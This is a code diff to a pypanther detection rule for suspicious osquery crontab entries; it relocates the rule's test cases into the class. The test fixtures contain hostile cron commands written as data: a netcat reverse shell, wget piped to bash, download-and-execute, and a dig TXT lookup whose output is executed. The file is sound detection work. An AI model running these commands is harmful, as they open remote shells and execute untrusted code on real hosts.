@@ -4,123 +4,6 @@ from fnmatch import fnmatch
 from pypanther import LogType, Rule, RuleTest, Severity, panther_managed
 from pypanther.helpers.base import deep_get
 
-osquery_suspicious_cron_tests: list[RuleTest] = [
-    RuleTest(
-        name="Netcat Listener",
-        expected_result=True,
-        log={
-            "name": "pack_incident-response_crontab",
-            "hostIdentifier": "test-host",
-            "action": "added",
-            "columns": {
-                "event": "",
-                "minute": "17",
-                "hour": "*",
-                "day_of_month": "*",
-                "month": "*",
-                "day_of_week": "7",
-                "command": "nc -e /bin/bash 237.233.242.58 80",
-                "path": "/etc/crontab",
-            },
-        },
-    ),
-    RuleTest(
-        name="Wget Pipe Bash",
-        expected_result=True,
-        log={
-            "name": "pack_incident-response_crontab",
-            "action": "added",
-            "hostIdentifier": "test-host",
-            "columns": {
-                "event": "",
-                "minute": "17",
-                "hour": "*",
-                "day_of_month": "*",
-                "month": "*",
-                "day_of_week": "7",
-                "command": "wget -qO- -U- https://sd9fd8f9d8fe.io/i.sh|bash >/dev/null 2>&1",
-                "path": "/etc/crontab",
-            },
-        },
-    ),
-    RuleTest(
-        name="Wget Execute",
-        expected_result=True,
-        log={
-            "name": "pack_incident-response_crontab",
-            "action": "added",
-            "hostIdentifier": "test-host",
-            "columns": {
-                "event": "",
-                "minute": "17",
-                "hour": "*",
-                "day_of_month": "*",
-                "month": "*",
-                "day_of_week": "7",
-                "command": "wget -O /tmp/load.sh http://test[.]io/load.sh; chmod 777 /tmp/load.sh; /tmp/load.sh >> /tmp/out.log",
-                "path": "/etc/crontab",
-            },
-        },
-    ),
-    RuleTest(
-        name="Dig",
-        expected_result=True,
-        log={
-            "name": "pack_incident-response_crontab",
-            "action": "added",
-            "hostIdentifier": "test-host",
-            "columns": {
-                "event": "",
-                "minute": "17",
-                "hour": "*",
-                "day_of_month": "*",
-                "month": "*",
-                "day_of_week": "7",
-                "command": '/bin/sh -c "sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)"',
-                "path": "/etc/crontab",
-            },
-        },
-    ),
-    RuleTest(
-        name="Built-in Cron",
-        expected_result=False,
-        log={
-            "name": "pack_incident-response_crontab",
-            "action": "added",
-            "hostIdentifier": "test-host",
-            "columns": {
-                "event": "",
-                "minute": "17",
-                "hour": "*",
-                "day_of_month": "*",
-                "month": "*",
-                "day_of_week": "7",
-                "command": "root cd / && run-parts --report /etc/cron.hourly",
-                "path": "/etc/crontab",
-            },
-        },
-    ),
-    RuleTest(
-        name="Command with quotes",
-        expected_result=False,
-        log={
-            "name": "pack_incident-response_crontab",
-            "action": "added",
-            "hostIdentifier": "test-host",
-            "columns": {
-                "event": "",
-                "minute": "17",
-                "hour": "*",
-                "day_of_month": "*",
-                "month": "*",
-                "day_of_week": "7",
-                "command": "runit 'go fast'",
-                "path": "/etc/crontab",
-            },
-        },
-    ),
-]
-
 
 @panther_managed
 class OsquerySuspiciousCron(Rule):
@@ -134,7 +17,6 @@ class OsquerySuspiciousCron(Rule):
     default_runbook = "Analyze the command to ensure no nefarious activity is occurring"
     default_reference = "https://en.wikipedia.org/wiki/Cron"
     summary_attributes = ["action", "hostIdentifier", "name"]
-    tests = osquery_suspicious_cron_tests
     # Running in unexpected locations
     # nosec
     # Reaching out to the internet
@@ -162,3 +44,120 @@ class OsquerySuspiciousCron(Rule):
 
     def title(self, event):
         return f"Suspicious cron found on [{event.get('hostIdentifier', '<UNKNOWN_HOST>')}]"
+
+    tests = [
+        RuleTest(
+            name="Netcat Listener",
+            expected_result=True,
+            log={
+                "name": "pack_incident-response_crontab",
+                "hostIdentifier": "test-host",
+                "action": "added",
+                "columns": {
+                    "event": "",
+                    "minute": "17",
+                    "hour": "*",
+                    "day_of_month": "*",
+                    "month": "*",
+                    "day_of_week": "7",
+                    "command": "nc -e /bin/bash 237.233.242.58 80",
+                    "path": "/etc/crontab",
+                },
+            },
+        ),
+        RuleTest(
+            name="Wget Pipe Bash",
+            expected_result=True,
+            log={
+                "name": "pack_incident-response_crontab",
+                "action": "added",
+                "hostIdentifier": "test-host",
+                "columns": {
+                    "event": "",
+                    "minute": "17",
+                    "hour": "*",
+                    "day_of_month": "*",
+                    "month": "*",
+                    "day_of_week": "7",
+                    "command": "wget -qO- -U- https://sd9fd8f9d8fe.io/i.sh|bash >/dev/null 2>&1",
+                    "path": "/etc/crontab",
+                },
+            },
+        ),
+        RuleTest(
+            name="Wget Execute",
+            expected_result=True,
+            log={
+                "name": "pack_incident-response_crontab",
+                "action": "added",
+                "hostIdentifier": "test-host",
+                "columns": {
+                    "event": "",
+                    "minute": "17",
+                    "hour": "*",
+                    "day_of_month": "*",
+                    "month": "*",
+                    "day_of_week": "7",
+                    "command": "wget -O /tmp/load.sh http://test[.]io/load.sh; chmod 777 /tmp/load.sh; /tmp/load.sh >> /tmp/out.log",
+                    "path": "/etc/crontab",
+                },
+            },
+        ),
+        RuleTest(
+            name="Dig",
+            expected_result=True,
+            log={
+                "name": "pack_incident-response_crontab",
+                "action": "added",
+                "hostIdentifier": "test-host",
+                "columns": {
+                    "event": "",
+                    "minute": "17",
+                    "hour": "*",
+                    "day_of_month": "*",
+                    "month": "*",
+                    "day_of_week": "7",
+                    "command": '/bin/sh -c "sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)"',
+                    "path": "/etc/crontab",
+                },
+            },
+        ),
+        RuleTest(
+            name="Built-in Cron",
+            expected_result=False,
+            log={
+                "name": "pack_incident-response_crontab",
+                "action": "added",
+                "hostIdentifier": "test-host",
+                "columns": {
+                    "event": "",
+                    "minute": "17",
+                    "hour": "*",
+                    "day_of_month": "*",
+                    "month": "*",
+                    "day_of_week": "7",
+                    "command": "root cd / && run-parts --report /etc/cron.hourly",
+                    "path": "/etc/crontab",
+                },
+            },
+        ),
+        RuleTest(
+            name="Command with quotes",
+            expected_result=False,
+            log={
+                "name": "pack_incident-response_crontab",
+                "action": "added",
+                "hostIdentifier": "test-host",
+                "columns": {
+                    "event": "",
+                    "minute": "17",
+                    "hour": "*",
+                    "day_of_month": "*",
+                    "month": "*",
+                    "day_of_week": "7",
+                    "command": "runit 'go fast'",
+                    "path": "/etc/crontab",
+                },
+            },
+        ),
+    ]
